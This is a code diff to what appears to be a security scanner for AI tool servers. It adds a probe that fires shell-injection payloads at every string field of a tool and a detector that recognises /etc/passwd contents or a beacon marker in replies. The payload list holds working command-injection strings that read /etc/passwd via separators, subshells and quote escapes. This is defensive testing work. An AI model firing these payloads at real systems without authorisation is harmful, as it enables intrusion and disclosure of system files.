@@ -113,6 +113,20 @@ _PAAS_ENV_SHAPE = re.compile(
     r"\"target\"\s*:\s*\"production\".+\"env\"\s*:\s*\{|"
     r"\"envId\"\s*:\s*\"env_)"
 )
+# EP-T12 — shell-injection landing signature. Matches when our
+# injected shell metacharacters caused command execution. Two
+# tells:
+#   (a) ``ARGUS_INJECT_BEACON_<digits>`` — our own marker,
+#       unambiguous proof the shell ran ``echo``.
+#   (b) ``/etc/passwd``-shape lines (``root:x:0:0:`` / ``daemon:x:``)
+#       — the canonical readable-but-sensitive file the injection
+#       payloads target. Echo of the literal payload string is
+#       caught upstream by ``_strip_payload_echoes``.
+_SHELL_INJECTION_SHAPE = re.compile(
+    r"(?:ARGUS_INJECT_BEACON_\d+|"
+    r"^root:x:0:0:|^daemon:x:|^bin:x:|^sys:x:|^nobody:x:)"
+    , re.MULTILINE,
+)
 
 # Scope-overgrant signatures (OAuth supply-chain pattern). "Allow All",
 # wildcards, or every common high-risk Google Workspace scope granted.
@@ -292,6 +306,28 @@ def _path_payloads(
     if field is None:
         return []
     return [_schema_payload(surface, field, p, hints) for p in paths]
+
+
+def _string_property_names(schema: dict) -> list[str]:
+    """Every top-level property whose declared type is ``string``.
+    The shell-injection probe targets ALL of these (not just the
+    ones our path/url/command/code matchers recognise) because
+    server-side ``execSync(`cmd ${x}`)`` callers don't restrict
+    themselves to schema-named-path fields — they pass any
+    user-supplied string in. ``container_id`` in
+    @alfonsograziano/node-code-sandbox-mcp's ``stop_sandbox`` is
+    the canonical example: a string field never declared as
+    path/url/command/code, but lethally injectable."""
+    if not isinstance(schema, dict):
+        return []
+    props = schema.get("properties") or {}
+    if not isinstance(props, dict):
+        return []
+    out = []
+    for name, spec in props.items():
+        if isinstance(spec, dict) and spec.get("type") == "string":
+            out.append(str(name))
+    return out
 
 
 def _url_payloads(
@@ -764,6 +800,92 @@ def _code_run_pivot_payloads(
     return [{"code": s} for s in all_snippets]
 
 
+# ── EP-T12 — Shell-injection in arbitrary string fields ────────────────────
+#
+# Server-side handlers that template user-supplied strings into shell
+# commands (``execSync(`docker rm -f ${container_id}`)``,
+# ``Popen(f"git checkout {branch}")``, etc.) are vulnerable to shell-
+# metacharacter injection on EVERY string parameter — not just the
+# fields our path/url/command/code matchers recognise as "command-
+# shaped." CVE-2025-53372 is exactly this class:
+# ``stop_sandbox(container_id)`` passes the string straight into a
+# shell template.
+#
+# This probe fires shell-metacharacter injections at every string
+# property in the tool's schema. The detector layer scans responses
+# for ``/etc/passwd``-style content (``root:x:0:0:``) and our own
+# ``ARGUS_INJECT_*`` markers — both signal that a metacharacter
+# triggered command execution server-side.
+
+# Tools that should never be probed for injection — their entire
+# purpose is to accept arbitrary user-supplied strings. EP-T11
+# already covers code-execution surfaces with proper code probes;
+# we don't want to spam them with injection variants too.
+_INJECTION_SKIP_FIELD_HINTS: tuple[str, ...] = (
+    "code", "script", "snippet", "source_code", "expression",
+    "python_code", "javascript_code",
+)
+
+# Shell metacharacter payloads. Each is benign on its own (reads
+# /etc/passwd or echoes a marker — does not modify state). Markers
+# like ARGUS_INJECT_<hash> let us distinguish ''target executed our
+# injection'' from ''target echoed our payload''.
+_INJECTION_PAYLOADS: tuple[str, ...] = (
+    # Command separators — basic chained-execution test.
+    "; cat /etc/passwd",
+    "& cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "|| cat /etc/passwd",
+    "| cat /etc/passwd",
+    # Subshell / command-substitution forms.
+    "$(cat /etc/passwd)",
+    "`cat /etc/passwd`",
+    # Combined with a sentinel marker — judge / detector can confirm
+    # execution by spotting the marker in the response without
+    # depending on /etc/passwd presence.
+    "; echo ARGUS_INJECT_BEACON_$$",
+    "$(echo ARGUS_INJECT_BEACON_$$)",
+    "`echo ARGUS_INJECT_BEACON_$$`",
+    # Newline-terminated injection — some templates strip trailing
+    # whitespace but not embedded \n.
+    "\ncat /etc/passwd\n",
+    # Quote-escape attempts — for templates that single- or double-
+    # quote the interpolation point.
+    "'; cat /etc/passwd; '",
+    "\"; cat /etc/passwd; \"",
+)
+
+
+def _shell_injection_payloads(
+    surface: Surface, ctx: ProbeContext,
+) -> list[dict]:
+    """EP-T12 — fire shell-metacharacter payloads at every string
+    field in the tool's schema. Catches the
+    ``execSync(`cmd ${param}`)`` class of injection vulns that
+    don't have a dedicated ''command'' field — the parameter is
+    just ``id``, ``name``, ``branch``, ``container_id``, etc.
+
+    Skips fields that are already covered by EP-T11 code-run
+    probes (``code`` / ``script`` / etc.) so we don't double-probe.
+    """
+    string_fields = _string_property_names(surface.schema or {})
+    if not string_fields:
+        return []
+    # Drop fields that EP-T11 handles dedicatedly.
+    target_fields = [
+        f for f in string_fields
+        if f.lower() not in _INJECTION_SKIP_FIELD_HINTS
+    ]
+    if not target_fields:
+        return []
+
+    out: list[dict] = []
+    for field in target_fields:
+        for inj in _INJECTION_PAYLOADS:
+            out.append(_schema_payload(surface, field, inj))
+    return out
+
+
 # ── Technique registry ──────────────────────────────────────────────────────
 
 @dataclass
@@ -878,6 +1000,16 @@ def _is_oauth_surface(s: Surface) -> bool:
             or "workspace" in d or "integration" in d)
 
 
+def _is_tool_surface_with_strings(s: Surface) -> bool:
+    """EP-T12 surface matcher. True for any tool whose schema
+    declares at least one string-typed property — that's the
+    universe of tools where shell-injection-into-string-field
+    is mechanically possible. Schema-first; no name list."""
+    if s.kind != "tool":
+        return False
+    return bool(_string_property_names(s.schema or {}))
+
+
 TECHNIQUES: dict[str, Technique] = {
     # EP-T1/T2/T3/T5 — each drives attack content into a tool that
     # takes path/command/code inputs. The shared ``_is_exec_surface``
@@ -933,6 +1065,17 @@ TECHNIQUES: dict[str, Technique] = {
         id="EP-T11-code-run-pivot", family="A", kind="probe",
         payload_fn=_code_run_pivot_payloads,
         surface_match=_is_code_run_surface,
+        severity="CRITICAL"),
+    # EP-T12 — shell-injection in arbitrary string fields. Matcher:
+    # tool surface has ANY string property in its schema. This is
+    # the generic ``execSync(`cmd ${param}`)``-class vuln that
+    # plain command/code matchers miss. CVE-2025-53372 (stop_sandbox
+    # container_id), kubectl-style ID fields, git ref names — all
+    # caught here.
+    "EP-T12-shell-injection": Technique(
+        id="EP-T12-shell-injection", family="A", kind="probe",
+        payload_fn=_shell_injection_payloads,
+        surface_match=_is_tool_surface_with_strings,
         severity="CRITICAL"),
 }
 
@@ -1043,6 +1186,9 @@ def _scan_for_shapes(text: str, technique_id: str) -> list[_DiscoveryHit]:
         "EP-T6-oauth-scope-enum":         ("oauth_scope",     _OAUTH_INTROSPECT_SHAPE),
         "EP-T9-workspace-pivot":          ("workspace_shape", _WORKSPACE_SHAPE),
         "EP-T10-paas-envvar-pivot":       ("paas_env_shape",  _PAAS_ENV_SHAPE),
+        # Shell-injection landing — beacon marker OR /etc/passwd
+        # shape in the response confirms metacharacter execution.
+        "EP-T12-shell-injection":         ("shell_injection", _SHELL_INJECTION_SHAPE),
     }
     name, pat = checks.get(technique_id, (None, None))
     if pat is None:
